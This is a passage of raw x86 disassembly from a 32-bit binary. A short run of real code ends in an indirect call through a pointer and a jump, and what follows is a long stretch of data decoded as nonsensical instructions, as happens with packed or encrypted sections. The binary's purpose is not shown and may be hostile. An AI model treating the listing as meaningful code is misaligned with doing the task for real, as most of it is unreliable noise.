  40387b:	mov    eax,ds:0x4217be
  403880:	push   DWORD PTR [eax]
  403882:	push   DWORD PTR ds:0x421a1a
  403888:	push   DWORD PTR ds:0x4217c6
  40388e:	push   DWORD PTR ds:0x4219fa
  403894:	push   DWORD PTR ds:0x421a8e
  40389a:	push   DWORD PTR [ebp-0x30]
  40389d:	push   DWORD PTR [ebp-0x20]
  4038a0:	mov    eax,DWORD PTR [ebp-0x8]
  4038a3:	mov    eax,DWORD PTR [eax]
  4038a5:	mov    eax,DWORD PTR [eax]
  4038a7:	mov    eax,DWORD PTR [eax]
  4038a9:	call   eax
  4038ab:	mov    eax,DWORD PTR [ebp-0x34]
  4038ae:	mov    ecx,DWORD PTR ds:0x4219be
  4038b4:	add    DWORD PTR [eax],ecx
  4038b6:	jmp    0x405c6b
  4038bb:	fnstenv [edx-0x73]
  4038be:	xchg   ebp,eax
  4038bf:	gs xchg ebp,eax
  4038c1:	test   eax,0x7c0e640e
  4038c6:	sbb    ch,BYTE PTR [eax-0x358ec822]
  4038cc:	pop    edi
  4038cd:	bound  esp,QWORD PTR [edx-0x36]
  4038d0:	pop    edi
  4038d1:	bound  esp,QWORD PTR [edx-0x9]
  4038d4:	xchg   edi,eax
  4038d5:	or     BYTE PTR [esi],0x53
  4038d8:	aam    0x97
  4038da:	(bad)  
  4038dc:	cdq    
  4038dd:	mov    al,ds:0x68327e47
  4038e2:	fstp   TBYTE PTR [edi+0x3f9f8474]
  4038e8:	sub    al,0x9e
  4038ea:	pop    edi
  4038eb:	imul   eax,DWORD PTR [ebx-0x14],0x668b390b
  4038f2:	es popf 
  4038f4:	aam    0xdb
  4038f6:	push   es
  4038f7:	adc    ah,BYTE PTR ds:0xc4bcf0cc
  4038fd:	cmp    BYTE PTR [ebx+0x2a],cl
  403900:	add    DWORD PTR [ecx+0x2e],esp
  403903:	(bad)  
  403904:	call   0xe54c3890
  403909:	scas   al,BYTE PTR es:[edi]
  40390a:	ds mov bh,0xd8
  40390d:	(bad)  
  40390f:	inc    esp
  403910:	fisub  DWORD PTR [ecx+0xd]
  403913:	adc    al,0xd8
  403915:	cld    
  403916:	retf   0xbede
  403919:	xchg   edi,eax
  40391a:	mov    al,ds:0x173e0833
  40391f:	ret    0xf10b
  403922:	mov    bl,bl
  403924:	test   al,0xea
  403926:	pop    es
  403927:	je     0x4039a3
  403929:	inc    ebx
  40392a:	jmp    0x4038fa
  40392c:	sbb    DWORD PTR [edx],edi
  40392e:	xor    eax,0xef6ad367
  403933:	push   edi
  403934:	and    dl,BYTE PTR [ebx-0x1b2b3017]
  40393a:	xchg   BYTE PTR [eax+0x41],al
  40393d:	inc    ebx
  40393e:	outs   dx,DWORD PTR ds:[esi]
  40393f:	jle    0x4038f8
  403941:	outs   dx,DWORD PTR ds:[esi]
  403942:	jecxz  0x403962
  403944:	repnz gs clc 
  403947:	sar    BYTE PTR [edx+0x29],cl
  40394a:	clc    
  40394b:	retf   0x1595
  40394e:	sub    DWORD PTR [di+0x4d30],edx
  403953:	mov    ds:0xcd83c773,eax
  403958:	shr    DWORD PTR [edx+0x19],0x68
  40395c:	mov    ch,0xaa
  40395e:	mov    eax,ds:0x468a58f3
  403963:	inc    edx
  403964:	nop
  403965:	jl     0x403973
  403967:	sbb    eax,0xc5206833
  40396c:	rol    DWORD PTR [ebx-0x3f],1
  40396f:	mov    ch,dl
  403971:	nop
  403972:	adc    DWORD PTR [esi+0x35b8eae1],eax
  403978:	adc    eax,DWORD PTR [ecx]
  40397a:	cmp    edi,DWORD PTR [ecx+0x15505eac]
  403980:	mov    edi,0x69393377
  403985:	add    al,0x59
  403987:	lds    edi,FWORD PTR [ebp-0xe7064d3]
  40398d:	jmp    0x61c7:0x14516f4b
  403994:	lahf   
  403995:	dec    ecx
  403996:	arpl   WORD PTR [esi],di
  403998:	or     BYTE PTR [ebx+0x76b58bb],bh
  40399e:	call   0xe877:0x83744fe5
  4039a5:	push   ecx
  4039a6:	sbb    al,0x22
  4039a8:	jno    0x4039a3
  4039aa:	push   es
  4039ab:	test   eax,0x67f7e0cb
  4039b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039b1:	jmp    0x4039e3
  4039b3:	js     0x403958
  4039b5:	sub    al,0xf7
  4039b8:	retf   
  4039b9:	daa    
  4039ba:	sahf   
  4039bb:	sar    BYTE PTR [edx],0xeb
  4039be:	jg     0x40399f
  4039c0:	call   0xc7492625
  4039c5:	fucomp st(4)
  4039c7:	xor    BYTE PTR [ebp+0x463e60f3],dh
  4039cd:	and    DWORD PTR [ecx+0x51],0x67
  4039d1:	rcl    BYTE PTR [ebp+0x6b],1
  4039d4:	pop    edi
  4039d5:	push   edi
  4039d6:	rol    DWORD PTR [ebx],1
  4039d8:	pop    edi
  4039d9:	dec    ebx
  4039da:	xchg   ecx,eax
  4039db:	push   edi
  4039dc:	(bad)  
  4039dd:	push   ebx
  4039de:	push   eax
  4039df:	ret    0x7054
  4039e2:	mov    cl,0xdc
  4039e4:	scas   eax,DWORD PTR es:[edi]
  4039e5:	push   0xffffffee
  4039e7:	sub    dh,BYTE PTR [edx-0x75f3a264]
  4039ed:	fdiv   st,st(7)
  4039ef:	stos   DWORD PTR es:[edi],eax
  4039f0:	sub    BYTE PTR [ebx+edi*2],al
  4039f3:	lea    edx,[edx-0x6f]
  4039f6:	mov    al,ds:0x350e73bd
  4039fb:	in     eax,0x4b
  4039fd:	cmp    bh,cl
  4039ff:	mov    bh,0xa4
  403a01:	push   cs
  403a02:	sub    al,0xe8
  403a04:	(bad)  
  403a05:	in     al,dx
  403a06:	std    
  403a07:	dec    DWORD PTR ds:0xa17a6745
  403a0d:	mov    ds:0xf0a259c9,al
  403a12:	add    BYTE PTR [eax],bl
  403a14:	iret   
  403a15:	dec    ebp
  403a16:	das    
  403a17:	ficomp WORD PTR [esi+ebx*8-0xe8345c0]
  403a1e:	mov    ecx,0xfe6c4e02
  403a23:	and    eax,0x4b3f5042
  403a28:	xor    esi,DWORD PTR [edx-0x4ce03c10]
  403a2e:	cld    
  403a2f:	push   0x5a9bcd84
  403a34:	xchg   ecx,eax
  403a35:	add    cl,BYTE PTR [esi+edx*4+0xb]
  403a39:	retf   
  403a3a:	xor    esi,esi
  403a3c:	dec    edi
  403a3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a3e:	ins    DWORD PTR es:[edi],dx
  403a3f:	and    al,0x7
  403a41:	or     eax,0xe41d4182
  403a46:	or     esi,DWORD PTR [edi]
  403a48:	xchg   eax,eax
  403a4a:	out    dx,al
  403a4b:	dec    ebx
  403a4c:	sub    ebp,esp
  403a4e:	leave  
  403a4f:	scas   al,BYTE PTR es:[edi]
  403a50:	push   cs
  403a51:	xchg   esp,eax
  403a52:	(bad)  
  403a53:	dec    dh
  403a55:	(bad)  
  403a57:	pop    es
  403a58:	out    0x8a,eax
  403a5a:	fld    DWORD PTR [esi+0xfa8407]
  403a60:	push   ss
  403a61:	test   ecx,0x604809ac
  403a67:	and    eax,0x77ec14e6
  403a6c:	push   es
  403a6d:	mov    eax,ds:0xb77c3a5b
  403a72:	pop    esp
  403a73:	out    dx,al
  403a74:	aam    0xf1
  403a76:	test   eax,0xbf7bad90
  403a7b:	push   esp
  403a7c:	out    dx,al
  403a7d:	xchg   ebx,eax
  403a7e:	in     eax,0x9a
  403a80:	test   eax,esp
  403a82:	or     eax,0x21a463c9
  403a87:	repnz xchg esi,eax
  403a89:	or     esi,ebp
  403a8b:	cld    
  403a8c:	pop    eax
  403a8d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a8f:	or     ecx,edx
  403a91:	add    DWORD PTR [edi],0xffffffb4
  403a94:	mov    bl,0xe9
  403a97:	lock arpl bx,di
  403a9a:	loope  0x403b19
  403a9c:	push   ebx
  403a9d:	fidiv  DWORD PTR [ecx]
  403a9f:	fucom  st(2)
  403aa1:	sahf   
  403aa2:	lods   al,BYTE PTR ds:[esi]
  403aa3:	out    0xde,eax
  403aa5:	fnsave [ebp+0x3b]
  403aa8:	pop    ecx
  403aa9:	in     eax,dx
  403aaa:	pop    ss
  403aab:	mov    ecx,ss
  403aad:	out    dx,al
  403aae:	inc    esp
  403aaf:	test   eax,0xaa39850d
  403ab4:	dec    edx
  403ab5:	ret    
  403ab6:	lahf   
  403ab7:	(bad)  
  403ab8:	retf   0x1831
  403abb:	loopne 0x403b36
  403abd:	clc    
  403abe:	fidiv  DWORD PTR [edi]
  403ac0:	ret    0xe4ef
  403ac3:	ftst   
  403ac5:	dec    ebx
  403ac6:	jbe    0x403b47
  403ac8:	lock fs ja 0x403a97
  403acc:	mov    WORD PTR [ebp-0x30],ss
  403acf:	push   es
  403ad0:	adc    al,0x13
  403ad2:	jne    0x403ab7
  403ad4:	outs   dx,DWORD PTR ds:[esi]
  403ad5:	lds    esp,FWORD PTR [edx+0x36]
  403ad8:	mov    al,0xea
  403ada:	add    DWORD PTR [eax+ebp*4],0xffffff9e
  403ade:	add    DWORD PTR [ecx+0x27],eax
  403ae1:	mov    ch,0x50
  403ae3:	and    al,0x29
  403ae5:	jle    0x403b17
  403ae7:	hlt    
  403ae8:	cmp    eax,0xb7312146
  403aed:	stos   BYTE PTR es:[edi],al
  403aee:	push   ss
  403aef:	mov    ebx,0x605c04c4
  403af4:	xlat   BYTE PTR ds:[ebx]
  403af5:	ret    0x1ba6
  403af8:	data16 sahf 
  403afa:	push   es
  403afb:	xor    BYTE PTR gs:[ecx-0x24d46cdd],ah
  403b02:	and    al,0x9c
  403b04:	out    dx,al
  403b05:	outs   dx,DWORD PTR ds:[esi]
  403b06:	retf   
  403b07:	out    0xb7,eax
  403b09:	xchg   edx,eax
  403b0a:	cld    
  403b0b:	shl    BYTE PTR [ebx-0x6b],cl
  403b0e:	jo     0x403b6b
  403b10:	lea    esi,[ebp-0x5c9818ad]
  403b16:	das    
  403b17:	nop
  403b18:	(bad)  
  403b19:	jl     0x403b52
  403b1b:	jecxz  0x403b68
  403b1d:	inc    edi
  403b1e:	add    cl,BYTE PTR [ebx]
  403b20:	pusha  
  403b21:	(bad)  [ebx+ebx*4-0x6f]
  403b25:	fwait
  403b26:	scas   eax,DWORD PTR es:[edi]
  403b27:	icebp  
  403b28:	repz into 
  403b2a:	outs   dx,BYTE PTR ds:[esi]
  403b2b:	cmc    
  403b2c:	test   DWORD PTR [ebx-0x24],0x64187c5c
  403b33:	mov    al,ds:0x8e7bb82a
  403b38:	mov    dl,0x2c
  403b3a:	and    eax,0x6d9e304c
  403b3f:	or     esp,DWORD PTR [ecx-0x4059eb6e]
  403b45:	pop    ecx
  403b46:	and    DWORD PTR [esi],esi
  403b48:	add    ah,bl
  403b4a:	ret    0x275d
  403b4d:	mov    ecx,0x260d1f58
  403b52:	and    ebx,DWORD PTR [esi+0x5d419fb]
  403b58:	pop    esp
  403b59:	push   ss
  403b5a:	rcl    DWORD PTR [edx+esi*2-0x1f],0x4a
  403b5f:	fist   DWORD PTR [edi-0x1fb63a75]
  403b65:	rcl    DWORD PTR [ecx-0xc],cl
  403b68:	test   al,0x3a
  403b6a:	ds es push cs
  403b6d:	adc    bl,BYTE PTR [eax+0xd]
  403b70:	aam    0x84
  403b72:	iret   
  403b73:	loope  0x403ba8
  403b75:	fstp   TBYTE PTR ds:0x5e4dbeb5
  403b7b:	jbe    0x403bae
  403b7d:	sub    BYTE PTR [eax],0x75
  403b80:	mov    BYTE PTR [esi+0x7cafe8c5],ah
  403b86:	xchg   ecx,eax
  403b87:	(bad)  
  403b88:	fdivr  QWORD PTR [ebx-0xb4ea33c]
  403b8e:	and    bl,BYTE PTR [ecx+0x68d7383f]
  403b94:	gs jnp 0x403c0f
  403b97:	mov    edx,0xe1676106
  403b9c:	outs   dx,DWORD PTR ds:[esi]
  403b9d:	lods   eax,DWORD PTR ds:[esi]
  403b9e:	int    0x8b
  403ba0:	enter  0x94,0x2a
  403ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ba5:	or     BYTE PTR [esi+0x3dcdd5c3],bl
  403bab:	jge    0x403c23
  403bad:	sub    DWORD PTR [esi-0x26],esi
  403bb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bb1:	jl     0x403b76
  403bb3:	pop    edi
  403bb4:	and    BYTE PTR [ebp-0x4e],0x30
  403bb8:	xor    DWORD PTR [ebx+0x2d6f9470],esi
  403bbe:	mov    al,0xb
  403bc0:	mov    esi,0xe259092c
  403bc5:	ins    BYTE PTR es:[edi],dx
  403bc6:	and    al,0x9c
  403bc8:	clc    
  403bc9:	test   BYTE PTR [ebp-0xcd0d881],dh
  403bcf:	push   ds
  403bd0:	cmc    
  403bd1:	icebp  
  403bd2:	mov    WORD PTR [edx+esi*2+0x10],?
  403bd6:	pop    ecx
  403bd7:	mov    ebp,0xe5336d5a
  403bdc:	out    0x10,eax
  403bde:	inc    ecx
  403bdf:	xchg   esi,eax
  403be0:	jmp    0x403bbb
  403be2:	nop
  403be3:	sbb    BYTE PTR [eax-0x46],al
  403be6:	inc    edx
  403be7:	fs loope 0x403bd6
  403bea:	shl    DWORD PTR [ebp-0xc15baf],cl
  403bf0:	imul   ebp,DWORD PTR [edx-0x6d],0xf
  403bf4:	cmp    DWORD PTR [eax+edi*2-0x49],esp
  403bf8:	push   edx
  403bf9:	rol    dh,0xd9
  403bfc:	ss retf 
  403bfe:	jp     0x403c73
  403c00:	(bad)  
  403c01:	and    cl,bh
  403c03:	std    
  403c04:	xor    bh,BYTE PTR [edi+0x42]
  403c07:	cmp    dh,BYTE PTR [edi]
  403c09:	xchg   esp,eax
  403c0a:	xor    eax,0xf3c838e8
  403c0f:	inc    ecx
  403c10:	push   edi
  403c11:	xchg   ebx,eax
  403c12:	(bad)  
  403c14:	(bad)  
  403c15:	push   cs
  403c16:	push   esp
  403c17:	inc    ebp
  403c18:	mov    dl,0xf6
  403c1a:	or     BYTE PTR [eax],bh
  403c1c:	or     ch,ah
  403c1e:	ror    BYTE PTR [edi-0x6f],0xba
  403c22:	push   ecx
  403c23:	arpl   WORD PTR [esi],di
  403c25:	and    al,al
  403c27:	xchg   ebx,eax
  403c28:	jo     0x403c81
  403c2a:	outs   dx,BYTE PTR ds:[esi]
  403c2b:	out    dx,al
  403c2c:	enter  0x3104,0xdd
  403c30:	mov    ecx,0x4514fbaa
  403c35:	mov    eax,edi
  403c37:	sbb    BYTE PTR [edx],ch
  403c39:	mov    edx,DWORD PTR [ebx-0x82a1f11]
  403c3f:	cld    
  403c40:	jp     0x403ca7
  403c42:	mov    ds:0x10e054d3,eax
  403c47:	shr    DWORD PTR [ecx+edx*2],1
  403c4a:	push   edx
  403c4b:	dec    eax
  403c4c:	(bad)  
  403c4d:	mov    WORD PTR [eax+ecx*8+0x4dacb967],ds
  403c54:	out    0x58,eax
  403c56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c57:	lea    esp,[si+0x694f]
  403c5c:	sbb    esp,DWORD PTR [ebx-0x58]
  403c5f:	retf   
  403c60:	fild   DWORD PTR [edi-0x682586dd]
  403c66:	dec    ecx
  403c67:	and    DWORD PTR [ebp+0x5a],eax
  403c6a:	pop    edx
  403c6b:	lea    ebp,[eax+0x5ea4983e]
  403c71:	inc    esi
  403c72:	add    ecx,DWORD PTR [ebx]
  403c74:	pop    esp
  403c75:	shl    DWORD PTR [edi],1
  403c77:	js     0x403ccd
  403c79:	inc    edi
  403c7a:	jg     0x403c11
  403c7c:	js     0x403cfb
  403c7e:	mov    bh,0x32
  403c80:	aas    
  403c81:	lods   eax,DWORD PTR ds:[esi]
  403c82:	scas   al,BYTE PTR es:[edi]
  403c83:	sub    dl,BYTE PTR [edi]
  403c85:	imul   ebx,DWORD PTR [ebp+edi*2+0x6678d0ec],0xffffff90
  403c8d:	add    ch,BYTE PTR [ebx+0x75]
  403c90:	ds or  al,0xe0
  403c93:	push   ss
  403c94:	xchg   esi,eax
  403c95:	int3   
  403c96:	fcomp  DWORD PTR [edx+0x48]
  403c99:	jbe    0x403c23
  403c9b:	jmp    0x6741:0x6e62c06a
  403ca2:	xor    ecx,DWORD PTR [edx+0x1633001d]
  403ca8:	out    0x13,eax
  403caa:	push   ecx
  403cab:	lds    ebx,FWORD PTR [edi+0x4bc06e34]
  403cb1:	cli    
  403cb2:	fistp  WORD PTR ds:0x1b2314a5
  403cb8:	push   0xf08049c1
  403cbd:	adc    bh,al
  403cbf:	xlat   BYTE PTR ds:[ebx]
  403cc0:	push   es
  403cc1:	push   ebp
  403cc2:	mov    cx,0x5b49
  403cc6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  403cc8:	bound  ebx,QWORD PTR [ebx+0x1b8d4b94]
  403cce:	fxch   st(0)
  403cd0:	add    DWORD PTR [ecx+eiz*2+0x7f],ebp
  403cd4:	xchg   DWORD PTR [esi+0x74f8c908],esi
  403cda:	push   ds
  403cdb:	sbb    eax,0x97fe55ec
  403ce0:	arpl   WORD PTR [ebp-0x59],sp
  403ce3:	pop    ebp
  403ce4:	loop   0x403d41
  403ce6:	stos   DWORD PTR es:[edi],eax
  403ce7:	jmp    0xadf7847c
  403cec:	lock sbb ah,BYTE PTR [ebp+0x6c]
  403cf0:	leave  
  403cf1:	into   
  403cf2:	push   ecx
  403cf3:	in     al,0x8f
  403cf5:	sub    dl,BYTE PTR [ebx-0x7037ebf2]
  403cfb:	push   esp
  403cfc:	scas   al,BYTE PTR es:[edi]
  403cfd:	mov    dh,0x3c
  403cff:	(bad)
  403d02:	dec    esp
  403d03:	mov    dl,0x22
  403d05:	fistp  QWORD PTR [ebx]
  403d07:	sbb    BYTE PTR [esi],bl
  403d09:	test   DWORD PTR [ecx+0x666449d0],esi
  403d0f:	jl     0x403cb9
  403d11:	or     al,0xa1
  403d13:	fisttp DWORD PTR [eax+eax*2]
  403d16:	int    0xc8
  403d18:	and    dl,dl
  403d1a:	ss dec esi
  403d1c:	mov    WORD PTR [ecx+0x17],?
  403d1f:	stos   BYTE PTR es:[edi],al
  403d20:	xchg   esi,eax
  403d21:	xor    DWORD PTR [edx-0x375bea7f],0xffffffc1
  403d28:	out    dx,al
  403d29:	add    BYTE PTR ds:0x95c7c3f,0xdc
  403d30:	mov    al,bh
  403d32:	test   al,0xee
  403d34:	sbb    al,BYTE PTR [ecx+esi*4-0x33f44786]
  403d3b:	inc    ecx
  403d3c:	rol    BYTE PTR [edx-0x6f8bb57a],0xa9
  403d43:	or     esp,DWORD PTR [ebx-0x34]
  403d46:	pop    ecx
  403d47:	loope  0x403da0
  403d49:	add    ch,dh
  403d4b:	adc    DWORD PTR [ebp-0x29],edx
  403d4e:	paddd  mm5,QWORD PTR [eax]
  403d51:	or     ebx,eax
  403d53:	fidiv  DWORD PTR [esi]
  403d55:	xor    al,BYTE PTR [ecx]
  403d57:	fs repnz pushf 
  403d5a:	pop    ss
  403d5b:	ja     0x403dbf
  403d5d:	xchg   ebx,eax
  403d5e:	push   ds
  403d5f:	jne    0x403dc0
  403d61:	aas    
  403d62:	pop    ecx
  403d63:	das    
  403d64:	clc    
  403d65:	cmp    ebx,DWORD PTR [ebp+0x13]
  403d68:	mov    ah,0x4c
  403d6a:	push   ebp
  403d6b:	jae    0x403d3f
  403d6d:	and    eax,0x33726bcd
  403d72:	sbb    eax,0x3fe3c1a2
  403d77:	mov    ebp,0x27e9c530
  403d7c:	mov    ss,WORD PTR [esi-0x2ab3267b]
  403d82:	push   ss
  403d83:	add    DWORD PTR [ebp+0x31ea8fea],eax
  403d89:	xchg   ebx,eax
  403d8a:	dec    ecx
  403d8b:	jle    0x403d11
  403d8d:	aas    
  403d8e:	pop    edx
  403d8f:	mov    edi,0xbb1f157c
  403d94:	or     eax,0x312c76e4
  403d99:	mov    edi,0x46b369e4
  403d9e:	xchg   ecx,eax
  403d9f:	mov    esi,0x1c4c2728
  403da4:	bound  esp,QWORD PTR [ebx]
  403da6:	nop
  403da7:	stos   BYTE PTR es:[edi],al
  403da8:	adc    ax,0x9a46
  403dac:	push   ds
  403dad:	cmp    DWORD PTR [ebx],esp
  403daf:	lahf   
  403db0:	push   0x1fc53a01
  403db5:	mov    es,WORD PTR [esi-0xc]
  403db8:	fistp  QWORD PTR [esi-0x10a5db47]
  403dbe:	icebp  
  403dbf:	and    ebp,DWORD PTR [edx-0x4d]
  403dc2:	mov    dl,0x97
  403dc4:	dec    esp
  403dc5:	mov    bh,0x13
  403dc7:	ret    0xb502
  403dca:	fwait
  403dcb:	or     BYTE PTR [edi],bh
  403dcd:	inc    esp
  403dce:	push   esp
  403dcf:	cdq    
  403dd0:	out    dx,eax
  403dd1:	imul   ebp,DWORD PTR [ecx],0x25
  403dd4:	xchg   eax,esi
  403dd6:	das    
  403dd7:	push   esp
  403dd8:	xor    DWORD PTR [edx],0xb384426c
  403dde:	fwait
  403ddf:	scas   al,BYTE PTR es:[edi]
  403de0:	add    DWORD PTR [ebx-0x48],ecx
  403de3:	or     al,BYTE PTR [edi]
  403de5:	inc    ecx
  403de6:	out    0x8d,al
  403de8:	mov    al,ds:0xef4896d7
  403ded:	and    esi,DWORD PTR [ebp-0x43877abd]
  403df3:	sub    dh,ah
  403df5:	pushf  
  403df6:	push   ecx
  403df7:	jge    0x403dcb
  403df9:	call   0x57d09594
  403dfe:	push   ebp
  403dff:	retf   
  403e00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e01:	pop    es
  403e02:	addr16 dec edi
  403e04:	jne    0x403dfe
  403e06:	(bad)  
  403e07:	dec    esi
  403e08:	dec    esp
  403e09:	mov    bh,0x5e
  403e0b:	ret    
  403e0c:	mov    ecx,0xabdbcb0b
  403e11:	sub    ah,ah
  403e13:	gs in  al,dx
  403e15:	inc    eax
  403e16:	push   ss
  403e17:	mov    ch,0xfc
  403e19:	pop    edx
  403e1a:	mov    dh,0x3b
  403e1c:	push   edx
  403e1d:	push   ebx
  403e1e:	mov    ebp,0xcc087bb5
  403e23:	repnz shrd DWORD PTR [edx],edi,cl
  403e27:	ret    
  403e28:	ss jbe 0x403e09
  403e2b:	fiadd  DWORD PTR [ebx+0x5a6a633f]
  403e31:	add    BYTE PTR ds:0x89675499,0x13
  403e38:	ins    DWORD PTR es:[edi],dx
  403e39:	ss sbb bl,ch
  403e3c:	mov    ah,0x44
  403e3e:	mov    ch,0x86
  403e40:	fldcw  WORD PTR [ebx]
  403e42:	push   es
  403e43:	sub    BYTE PTR [ebp+0x2e],dh
  403e46:	leave  
  403e47:	inc    esi
  403e48:	mov    edx,0x72d28e50
  403e4d:	ret    
  403e4e:	ror    bl,0x2b
  403e51:	addr16 loope 0x403ed3
  403e54:	pusha  
  403e55:	push   0x53bbf309
  403e5a:	sub    DWORD PTR [edx+0x72],esi
  403e5d:	push   edi
  403e5e:	outs   dx,BYTE PTR ds:[esi]
  403e5f:	loopne 0x403e29
  403e61:	pop    edi
  403e62:	sbb    ecx,DWORD PTR [eax]
  403e64:	ds in  eax,dx
  403e66:	repz mov al,ds:0x6d02f80b
  403e6c:	sahf   
  403e6d:	and    DWORD PTR [edi],0x1c
  403e70:	retf   0xb7e8
  403e73:	jle    0x403dfa
  403e75:	(bad)  
  403e76:	rcl    BYTE PTR [ebx],cl
  403e78:	mov    ecx,0xc74ba042
  403e7d:	fisub  WORD PTR ds:[ebp-0x6f]
  403e81:	stos   BYTE PTR es:[edi],al
  403e82:	or     DWORD PTR [esi-0x3ee0aaaa],ebp
  403e88:	imul   eax,edi,0x32
  403e8b:	outs   dx,DWORD PTR ds:[esi]
  403e8c:	stos   BYTE PTR es:[edi],al
  403e8d:	pop    ds
  403e8e:	dec    ebp
  403e8f:	call   0x12c:0x18662104
  403e96:	add    bh,dh
  403e98:	jecxz  0x403efd
  403e9a:	(bad)  
  403e9b:	popf   
  403e9c:	neg    DWORD PTR [edx+ecx*2]
  403e9f:	sbb    al,0x2d
  403ea1:	loope  0x403ec6
  403ea3:	mov    al,ds:0x195227d8
  403ea8:	and    eax,0xfec5b33a
  403ead:	jne    0x403f07
  403eaf:	lds    ebx,FWORD PTR [ebx-0x55]
  403eb2:	xor    eax,0xef956c74
  403eb7:	rcr    BYTE PTR [ebx],cl
  403eb9:	mov    ecx,0xe092abbb
  403ebe:	mov    bl,0x20
  403ec0:	or     dh,BYTE PTR [edi+0x275123ec]
  403ec6:	rcr    ch,cl
  403ec8:	aas    
  403ec9:	mov    bh,0x29
  403ecb:	shl    esi,cl
  403ecd:	sahf   
  403ece:	sbb    BYTE PTR [ecx-0x7],dh
  403ed1:	rol    ch,1
  403ed3:	pusha  
  403ed4:	arpl   WORD PTR [edi+0x539b203c],bp
  403eda:	add    al,0xd6
  403edc:	dec    esp
  403edd:	pop    ebp
  403ede:	sub    eax,0xf33a40c4
  403ee3:	xor    al,0xd0
  403ee5:	dec    esi
  403ee6:	lods   eax,DWORD PTR ds:[esi]
  403ee7:	clc    
  403ee8:	mov    ds:0xf2576d39,eax
  403eed:	test   eax,0x34eb24b3
  403ef2:	sub    DWORD PTR [ebp+0x4ce1bb43],eax
  403ef8:	mov    esi,DWORD PTR [eax]
  403efa:	test   DWORD PTR [eax-0x74bd5e9d],eax
  403f00:	adc    ch,BYTE PTR [eax-0x75]
  403f03:	icebp  
  403f04:	shl    DWORD PTR [eax+0x6c],1
  403f07:	sub    cl,BYTE PTR ds:0xa4126dd3
  403f0d:	in     al,0x8c
  403f0f:	int    0x5f
  403f11:	clc    
  403f12:	mov    dl,0xba
  403f14:	imul   DWORD PTR [edx+0x79e2cff9]
  403f1a:	aad    0x69
  403f1c:	xchg   esp,eax
  403f1d:	mov    WORD PTR [ecx-0x58101ba6],gs
  403f23:	xlat   BYTE PTR ds:[ebx]
  403f24:	xchg   esp,eax
  403f25:	mov    WORD PTR [edx+0x7e39304b],gs
  403f2b:	xlat   BYTE PTR ds:[ebx]
  403f2c:	jo     0x403f6b
  403f2e:	rol    DWORD PTR [ebx],0xe3
  403f31:	out    dx,eax
  403f32:	outs   dx,DWORD PTR ds:[esi]
  403f33:	dec    esi
  403f34:	sbb    cl,dl
  403f36:	xchg   ebx,eax
  403f37:	inc    ebp
  403f38:	jo     0x403f35
  403f3a:	stos   DWORD PTR es:[edi],eax
  403f3b:	dec    ecx
  403f3c:	test   al,bh
  403f3e:	lds    esp,FWORD PTR ds:0x56f9a136
  403f44:	std    
  403f45:	shl    DWORD PTR [edx],1
  403f47:	or     al,0xeb
  403f49:	adc    eax,0xff9f13a
  403f4e:	xor    esp,edx
  403f50:	sub    bl,BYTE PTR gs:[ecx]
  403f53:	mov    al,BYTE PTR [ebx+0x1176ba3e]
  403f59:	sub    BYTE PTR [esi],cl
  403f5b:	add    ebp,DWORD PTR [ecx+0x1e134118]
  403f61:	or     edx,DWORD PTR [eax-0x58]
  403f64:	aam    0x5e
  403f66:	mov    ecx,DWORD PTR [ecx-0x50]
  403f69:	mov    ecx,0x2019247a
  403f6e:	shl    BYTE PTR [edx+0x67],1
  403f71:	sbb    ch,0x22
  403f74:	je     0x403ff5
  403f76:	ficom  WORD PTR [esi+0x63]
  403f79:	adc    BYTE PTR [edi+0x32],ah
  403f7c:	sbb    dl,BYTE PTR [edx-0x33850e24]
  403f82:	lahf   
  403f83:	test   BYTE PTR [ecx],ch
  403f85:	xchg   DWORD PTR [ebx+0x2a],ebp
  403f88:	sahf   
  403f89:	xor    DWORD PTR ds:0x866fefaf,ecx
  403f8f:	inc    edi
  403f90:	mov    ds:0x9801ff13,eax
  403f95:	mov    ebx,0x7fda59a4
  403f9a:	mov    edi,0x58a12ba1
  403f9f:	clc    
  403fa0:	add    edx,DWORD PTR [edi-0x24]
  403fa3:	mov    esp,0xc20aca63
  403fa8:	int3   
  403fa9:	addr16 inc ebx
  403fab:	and    bh,bh
  403fad:	dec    esi
  403fae:	fcmovnbe st,st(4)
  403fb0:	pop    es
  403fb1:	(bad)  
  403fb2:	or     al,0xe0
  403fb4:	pop    esp
  403fb5:	inc    edx
  403fb6:	outs   dx,DWORD PTR ds:[esi]
  403fb7:	push   0x38cd95f9
  403fbc:	cmp    BYTE PTR [ebp+ebx*2-0x43],0xea
  403fc1:	xor    BYTE PTR [eax-0x6b],al
  403fc4:	shr    DWORD PTR [eax],0x85
  403fc7:	jge    0x403fe8
  403fc9:	dec    edx
  403fca:	fcomp  DWORD PTR [edi+0x3d1df0a6]
  403fd0:	inc    eax
  403fd1:	mov    eax,ds:0x7a24bf94
  403fd6:	and    bh,al
  403fd8:	ins    DWORD PTR es:[edi],dx
  403fd9:	push   eax
  403fda:	shl    edx,0x49
  403fdd:	push   cs
  403fde:	xchg   ecx,eax
  403fe0:	clc    
  403fe1:	or     eax,0x738b495d
  403fe6:	out    0x2a,al
  403fe8:	pop    ebp
  403fe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fea:	in     al,0x3f
  403fec:	or     ax,0x290f
  403ff0:	push   ecx
  403ff1:	cld    
  403ff2:	repz neg bl
  403ff5:	leave  
  403ff6:	stos   DWORD PTR es:[edi],eax
  403ff7:	xor    eax,0xb37c08de
  403ffc:	sbb    eax,0xe4b0370a
  404001:	fidiv  DWORD PTR [ebx+ebx*2-0x32]
  404005:	shl    DWORD PTR [esi],cl
  404007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404008:	push   esi
  404009:	jle    0x404034
  40400b:	xchg   BYTE PTR [edx+0x75],ah
  40400e:	adc    al,0xf4
  404010:	retf   0x1ee3
  404013:	mov    eax,0x4a4a64e9
  404018:	(bad)  
  404019:	test   BYTE PTR [eax],bh
  40401b:	inc    ecx
  40401c:	sub    eax,DWORD PTR [ecx-0x524551c5]
  404022:	popa   
  404023:	jo     0x40400f
